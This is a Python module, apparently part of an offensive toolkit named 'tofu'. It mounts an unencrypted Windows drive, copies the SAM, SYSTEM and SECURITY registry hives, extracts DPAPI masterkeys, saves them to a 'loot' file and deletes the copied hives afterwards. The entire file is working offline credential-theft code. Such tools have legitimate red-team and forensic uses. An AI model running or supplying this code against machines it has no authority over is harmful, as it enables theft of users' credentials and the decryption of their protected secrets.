import tofu_lib.dpapi
import os
import subprocess
import shutil
import time
def __main__(drive_name,drive_format):
	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
		print("[-] This module does not work with a Bitlocker drive")
	elif drive_name == None:
		print("[-] This module needs a drive to work; use 'usedrive'")
	else:
		if not os.path.exists("tofu_tmp/windows_filesystem"):
			os.mkdir("tofu_tmp/windows_filesystem")
		else:
			try:
				# quick clean up incase another script forgot to unmount the filesystem
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
			except:
				pass
		print("[#] Preparing key file at 'tofu_loot/masterkeys.txt'")
		try:
			open("tofu_loot/masterkeys.txt",'x').close()
		except FileExistsError:
			pass

		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
		try:
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SYSTEM","tofu_tmp/HASHDUMP_SYSTEM")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SAM","tofu_tmp/HASHDUMP_SAM")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SECURITY","tofu_tmp/HASHDUMP_SECURITY")
			masterkeys = tofu_lib.dpapi.get_masterkeys("tofu_tmp/windows_filesystem", "tofu_tmp/HASHDUMP_SAM", "tofu_tmp/HASHDUMP_SYSTEM", "tofu_tmp/HASHDUMP_SECURITY")
			if masterkeys.masterkeys:
				print("[+] We have masterkeys!")
				keylogfile = open("tofu_loot/masterkeys.txt",'a')
				for masterkey in masterkeys.masterkeys:
					keylogfile.write(f"{masterkey}\n")
					print(f"-- MASTERKEY / {masterkey}")
					
			else:
				print("[-] We don't have any masterkeys; This could be because all the users on the machine are domain users")
				 
			
			time.sleep(2)
			try:
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
				print("[+] Successfully unmounted")
			except Exception as unmount_error:
				print(f"Error Unmounting : {unmount_error}")
			
		
			try:
				os.remove("tofu_tmp/HASHDUMP_SYSTEM")
				os.remove("tofu_tmp/HASHDUMP_SAM")
				os.remove("tofu_tmp/HASHDUMP_SECURITY")
			except Exception as delete_error:
				print(f"[-] Error while deleting temporary files : {delete_error}")			
			print("[+] Masterkeys saved to 'tofu_loot/masterkeys.txt'")
		except Exception as open_error:
			print(f"[-] Error {open_error}")

